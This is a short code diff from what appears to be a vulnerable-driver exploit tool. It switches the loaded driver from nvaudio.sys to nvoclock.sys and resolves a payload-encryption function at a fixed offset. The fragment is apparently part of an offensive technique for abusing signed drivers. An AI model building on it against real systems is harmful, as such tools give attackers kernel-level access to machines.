@@ -81,11 +81,11 @@ public:
         *	Import the vulnerable driver into memory
         */
 
-        HMODULE nvaudio = LoadLibraryW(L"C:\\nvaudio.sys");
+        HMODULE nvoclock = LoadLibraryW(L"C:\\nvoclock.sys");
 
-        if (!nvaudio)
+        if (!nvoclock)
         {
-            printf("nvaudio.sys not found at C: directory!\n");
+            printf("nvoclock.sys not found at C: directory!\n");
             exit(5000);
         }
 
@@ -94,7 +94,7 @@ public:
         *	Get the payload encryption function sub_2130
         */
 
-        encrypt_payload = (decltype(encrypt_payload))(__int64(nvaudio) + 0x2130);
+        encrypt_payload = (decltype(encrypt_payload))(__int64(nvoclock) + 0x2130);
 
 
 
